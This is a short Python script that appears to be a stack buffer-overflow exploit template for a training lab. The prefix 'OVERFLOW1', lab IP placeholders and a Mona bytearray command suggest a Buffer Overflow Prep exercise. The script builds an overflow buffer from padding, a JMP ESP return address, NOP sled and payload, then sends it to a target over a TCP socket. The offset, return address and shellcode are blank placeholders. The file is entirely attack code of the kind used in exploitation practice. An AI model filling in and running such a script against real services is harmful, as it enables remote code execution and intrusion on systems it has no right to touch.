#!/usr/bin/env python3
import socket
import os
## ---- Setup For HOST ----
ip = "10.10.xx.xx" # CHANGE THIS TO MACHINE IP
port = 1337
## ------------------------

prefix  = "OVERFLOW1 " # CHANGE THIS FOR TASK
offset  = 0
overflow= "A" * offset
retn    = "0" # JUMP ESP Address set to little endian 62 50 12 03 \x03\x12\x50\x62
padding = "" # NOP(No OPeration) prepare for ASLR '\x90' * 16

# Payload for finding the Offset. Comment this to change the payload
# payload = open('pattern.txt', 'r').read()
payload = ""
postfix = ""
buffer = prefix + overflow + retn + padding + payload + postfix

## Exploiting 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((ip, port))
    print("[+] Sending payload...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("[+] Done!")
except:
    print("[+] Could not connect.")


print("[+] Mona : !mona compare -f C:\mona\oscp\\bytearray.bin -a ")